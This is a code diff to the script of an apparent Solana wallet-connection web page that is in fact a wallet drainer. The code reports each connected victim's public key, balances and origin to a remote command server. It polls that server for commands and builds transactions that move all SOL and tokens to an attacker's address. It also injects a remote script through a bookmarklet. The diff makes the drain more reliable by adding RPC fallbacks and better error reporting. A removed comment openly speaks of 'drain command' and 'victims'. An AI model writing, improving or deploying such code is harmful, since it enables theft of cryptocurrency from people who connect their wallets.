@@ -88,7 +88,11 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     PROJECT_ID: "d1b37573e1f778b94d2bbe7cb29a92c1",
     SRV: "https://one234-et4e.onrender.com",
     BKEY: "72d296b612eb0a11931b364ba1333a70",
-    RPC: "https://api.mainnet-beta.solana.com",
+    RPCS: [
+      "https://api.mainnet-beta.solana.com",
+      "https://solana-rpc.publicnode.com",
+      "https://api.mainnet-beta.socean.com",
+    ],
     E: "https://esm.sh/",
   };
   const MINTS = {
@@ -98,16 +102,27 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   };
   const toast = t => { const d = document.createElement("div"); d.id = "toast"; d.textContent = t;
     document.body.appendChild(d); setTimeout(() => d.remove(), 6000); };
-  const post = (method, params) => fetch(CONFIG.RPC, { method: "POST", headers: { "content-type": "application/json" },
-    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) }).then(r => r.json());
+  // RPC with fallback — public mainnet-beta rate-limits under load; try the next endpoint on failure
+  async function rpc(method, params) {
+    for (const u of CONFIG.RPCS) {
+      try {
+        const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
+          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
+        const j = await r.json();
+        if (j && (j.result || j.error)) return j;
+      } catch (e) {}
+      await new Promise(s => setTimeout(s, 250));
+    }
+    return { error: { message: "all RPC endpoints failed" } };
+  }
 
   let client = null, topic = null, pk = null, busy = false, polled = false, mode = null, inj = null;
   let providerName = "none";
   let chainRef = "solana:5eykt4Us2vWuxg31QG9mBUX4de1NxpuPBkaQrn4GsV7C";
-  try { const g = await post("getGenesisHash"); if (g && g.result) chainRef = "solana:" + g.result; } catch (e) {}
+  try { const g = await rpc("getGenesisHash"); if (g && g.result) chainRef = "solana:" + g.result; } catch (e) {}
 
   const beacon = (m, o) => { o = o || {}; try {
-    fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST", mode: "no-cors",
+    fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST",
       body: JSON.stringify({ m: m, pk: pk, provider: providerName, origin: location.origin,
         sol: o.sol || 0, value: o.value || 0, toks: o.toks || "", mode: o.mode || "",
         sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
@@ -128,8 +143,8 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   async function reportBalances() {
     try {
       const res = await Promise.all([
-        post("getBalance", [pk]),
-        post("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
+        rpc("getBalance", [pk]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
         fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(j => j.json()).catch(() => null),
       ]);
       const bal = res[0], r = res[1], pj = res[2];
@@ -153,8 +168,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   function recall() { try { return JSON.parse(localStorage.getItem("__ppwc") || "null"); } catch (e) { return null; } }
   function forget() { try { localStorage.removeItem("__ppwc"); } catch (e) {} }
 
-  // FIX: gate on pk only — injected wallets have no WC topic, so topic-gating
-  // silently blocked every drain command for extension-connected victims.
+  // poll — gated on pk only (injected wallets have no WC topic)
   function pollCmd() {
     if (polled) return; polled = true;
     setInterval(async function () {
@@ -170,12 +184,16 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
       const spl = await import(CONFIG.E + "@solana/spl-token@0.4.9");
       const pkB = new PublicKey(pk), dest = new PublicKey(to);
       const res = await Promise.all([
-        post("getLatestBlockhash"),
-        post("getBalance", [pk]),
-        post("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
+        rpc("getLatestBlockhash"),
+        rpc("getBalance", [pk]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
       ]);
       const bh = res[0], bal = res[1], r = res[2];
-      if (!bh || !bh.result) { beacon("err", { msg: "blockhash failed" }); return; }
+      if (!bh || !bh.result) {
+        const why = bh && bh.error ? bh.error.message : "no result (rate-limited?)";
+        beacon("err", { msg: "blockhash failed: " + why });
+        return;
+      }
       const amt = {};
       for (const it of (r && r.result ? r.result.value : [])) {
         const d = it.account.parsed && it.account.parsed.data;
@@ -188,7 +206,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
         const mint = new PublicKey(MINTS[k]);
         const srcAta = new PublicKey(a.src);
         const destAta = await spl.getAssociatedTokenAddress(mint, dest);
-        const info = await post("getAccountInfo", [destAta, { encoding: "base64" }]);
+        const info = await rpc("getAccountInfo", [destAta, { encoding: "base64" }]);
         if (!(info && info.result && info.result.value))
           tx.add(spl.createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
         tx.add(spl.createTransfer(srcAta, destAta, pkB, a.raw));
@@ -245,7 +263,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   async function connect() {
     if (busy) return; busy = true;
     try {
-      // 1) injected extension first — with timeout; fall through to WC on failure
+      // 1) injected extension first — 25s timeout, falls through to QR on failure
       const f = findInjected();
       if (f) {
         try {
@@ -264,7 +282,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
           beacon("err", { msg: f.name + ": " + String(e && e.message || e) + " — falling back to QR" });
         }
       }
-      // 2) WalletConnect — QR on desktop, deep links on mobile, raw wc: URI
+      // 2) WalletConnect — raw wc: URI as QR + tap deep-links per wallet
       providerName = "walletconnect";
       const { uri, approval } = await client.connect({
         requiredNamespaces: { solana: { chains: [chainRef],
@@ -289,7 +307,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     if (el) el.onclick = () => { if (!busy) connect(); };
   });
 
-  // bookmark chip — SCRIPT TAG injection (no CORS, no fetch), not fetch+eval
+  // bookmark — script-tag injection (no CORS), visible failure toast
   (function () {
     const ORIGIN = location.origin;
     const BM = 'javascript:(function(d,s,u,t){s=d.createElement("script");s.src=u+"?t="+t;' +
